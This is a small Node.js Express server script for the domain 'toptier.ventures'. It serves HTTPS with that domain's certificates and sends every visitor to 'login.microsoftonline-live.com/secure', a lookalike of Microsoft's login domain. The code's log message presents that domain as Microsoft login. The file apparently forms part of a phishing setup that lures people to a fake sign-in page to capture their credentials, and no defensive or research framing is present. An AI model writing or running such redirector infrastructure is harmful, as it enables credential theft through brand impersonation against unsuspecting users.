const fs = require('fs');
const https = require('https');
const express = require('express');

console.log('Starting the application...');

const app = express();

let privateKey;
let certificate;

try {
  privateKey = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/privkey.pem', 'utf8');
  certificate = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/fullchain.pem', 'utf8');
  console.log('Certificates loaded successfully');
} catch (err) {
  console.error('Error loading certificates:', err);
  process.exit(1);
}

const credentials = { key: privateKey, cert: certificate };

const port = 442; // Ensure this port is open and not used by other services

app.get('/', (req, res) => {
  console.log('Redirecting to Microsoft login');
  res.redirect(301, 'https://login.microsoftonline-live.com/secure');
});

app.use((err, req, res, next) => {
  console.error('Application error:', err.stack);
  res.status(500).send('Something broke!');
});

const httpsServer = https.createServer(credentials, app);

// Redirect HTTP to HTTPS
const http = require('http');
http.createServer((req, res) => {
  res.writeHead(301, { "Location": "https://" + req.headers['host'] + req.url });
  res.end();
}).listen(80);

httpsServer.listen(port, '0.0.0.0', () => {
  console.log(`Proxy server listening at https://toptier.ventures`);
});
